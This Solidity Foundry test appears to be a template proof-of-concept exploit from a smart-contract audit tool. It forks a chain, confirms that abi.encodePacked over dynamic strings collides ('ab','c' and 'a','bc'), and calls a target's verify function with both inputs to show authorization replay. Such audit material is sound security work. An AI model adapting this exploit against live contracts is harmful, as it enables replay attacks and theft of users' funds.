// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- abi.encodePacked hash collision (dynamic args)
/// @notice Detector: encode-packed. The target hashes
///         keccak256(abi.encodePacked(a, b)) with DYNAMIC arguments.
///         Packed encoding has no lengths, so ("ab", "c") and ("a", "bc")
///         hash IDENTICALLY -- one authorization / claim can be replayed as
///         another.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt verify() to the target's real
///      function that hashes packed dynamic args.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        bytes32 h1 = keccak256(abi.encodePacked("ab", "c"));
        bytes32 h2 = keccak256(abi.encodePacked("a", "bc"));
        assertEq(h1, h2, "packed encodings differ -- pick another collision pair");

        // TODO: adapt to the target's real function (verify / claim /
        // authorize) that hashes packed dynamic args.
        (bool ok1,) = target.call(
            abi.encodeWithSignature("verify(string,string)", "ab", "c")
        );
        (bool ok2,) = target.call(
            abi.encodeWithSignature("verify(string,string)", "a", "bc")
        );
        console.log("verify(ab, c) ok:", ok1);
        console.log("verify(a, bc) ok:", ok2);
        assertTrue(ok1 && ok2, "exploit did not reproduce: both colliding inputs were not accepted");
    }
}
